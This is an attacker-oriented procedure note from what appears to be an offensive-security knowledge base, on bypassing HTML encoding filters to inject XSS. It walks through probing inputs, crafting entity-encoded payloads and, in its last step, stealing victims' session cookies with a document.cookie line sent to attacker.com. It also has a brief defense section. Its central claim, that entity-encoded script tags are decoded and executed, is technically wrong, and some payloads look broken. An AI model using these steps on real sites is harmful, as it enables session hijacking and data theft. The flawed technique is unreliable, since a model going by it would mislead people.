---
type: procedure
tactics:
  - '[[Execution]]'
techniques:
  - '[[JavaScript]]'
sub_techniques: []
tags:
  - xss
  - filter-bypass
  - html-encoding
commands: []
tools: []
platforms:
  - Web
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Bypass-HTML-Encoding-Filters-for-XSS-Injection

## Summary

This procedure outlines how to bypass HTML encoding filters in web applications to successfully inject and execute Cross-Site Scripting (XSS) payloads. By converting special characters like '<', '>', and JavaScript keywords into HTML entities, attackers can evade simplistic filters that block direct script injection, leading to code execution in victims' browsers for data theft, session hijacking, or site defacement.

## Description

HTML encoding filter bypass exploits weaknesses in web applications where input sanitization fails to decode or properly handle HTML entities (e.g., &lt; for '<', &amp; for '&'). Filters may strip or block raw '<script>' tags but allow encoded versions like &#60;script&#62;, which the browser decodes and executes. This technique targets reflected, stored, or DOM-based XSS vulnerabilities in user inputs such as search fields, comments, or URL parameters. In a typical scenario, an attacker identifies an input point, crafts an encoded payload, and tests it to confirm execution, often using browser developer tools or proxies. Success enables JavaScript execution, such as displaying alerts or exfiltrating cookies via document.cookie. Prerequisites include a vulnerable web app and basic web security knowledge; outcomes can include unauthorized access to user sessions or sensitive data.

## Requirements

1. Access to a web application with injectable input fields (e.g., forms, URL parameters) that reflect user input without proper sanitization.
2. Knowledge of HTML entity encoding (e.g., using decimal or hexadecimal entities for characters).
3. A web browser (e.g., Chrome, Firefox) with developer tools for testing, or a proxy like Burp Suite to intercept and modify requests.
4. Optional: A wordlist of common payloads or an online HTML encoder for quick crafting.

## Defense

Defensive measures and detection strategies:

- Implement strict output encoding using HTML entity encoding (e.g., via libraries like OWASP ESAPI) to ensure user input is never rendered as HTML without escaping.
- Deploy Content Security Policy (CSP) headers to restrict inline script execution and limit script sources.
- Use Web Application Firewalls (WAFs) with rules to detect encoded payloads, such as scanning for common entity patterns like &#x followed by hex values.
- Enable browser security features like XSS Auditor (deprecated but similar in modern browsers) and monitor application logs for suspicious entity usage or JavaScript errors.
- Regularly scan with tools like OWASP ZAP or Burp Scanner to identify encoding bypass vulnerabilities.

## Objectives

1. Identify and confirm a vulnerable input point in the target web application.
2. Craft and inject an HTML-encoded XSS payload that evades filters.
3. Verify payload execution through visual indicators like JavaScript alerts or network requests.
4. Demonstrate potential impact, such as stealing session cookies or redirecting users.

## Instructions

### Step 1: Identify Vulnerable Input Point

**Context**: Locate areas in the web application where user input is reflected back without proper sanitization, such as search boxes, comment forms, or URL query parameters. This step ensures the target is suitable for XSS injection.

Test basic injection by entering a simple payload like <script>alert(1)</script> and checking if it executes or is filtered. If blocked, proceed to encoding.

> If the raw payload is stripped or escaped (e.g., shown as text), the filter is active, confirming the need for bypass techniques.

### Step 2: Craft Encoded Payload

**Context**: Convert the malicious JavaScript into HTML entities to bypass filters. Use decimal (&#97; for 'a') or hexadecimal (&#x61; for 'a') encodings for characters like <, >, &, and alert keywords. This step creates payloads that the browser decodes post-filtering.

Reference the encoded payloads in [[codes/HTML-Encoded-JavaScript-Alert-Payloads]]. For example, select and customize one based on the filter's behavior (e.g., if & is blocked, use %26 for &).

> Common encodings: '<' becomes &#60; or &lt;, 'alert' becomes &#97;lert or a&#108;ert. Test variations to find what slips through.

### Step 3: Inject and Test Payload

**Context**: Submit the encoded payload into the identified input point and observe if the browser executes it. This verifies the bypass and measures success.

Enter the payload (e.g., %26%2397;lert(1) from the code reference) into the input field or URL parameter. Submit the form or load the page, then inspect the response in browser dev tools (Network tab) to see if entities are decoded and executed.

If using a proxy, intercept the request, modify the input with the encoded payload, and forward it.

> Expected behavior: A JavaScript alert box pops up with '1' or the domain, indicating successful execution. If not, iterate with different encodings.

### Step 4: Verify and Escalate

**Context**: Confirm the XSS works on victim browsers and explore impact, such as data exfiltration. This step transitions from proof-of-concept to exploitation.

Replace the alert with a payload to steal cookies: e.g., encode document.location='http://attacker.com?cookie='+document.cookie. Test in an incognito window to simulate a victim.

Monitor attacker server logs for incoming data to validate exfiltration.

> Success: Victim's cookies or other data received on attacker-controlled endpoint, demonstrating full compromise potential.
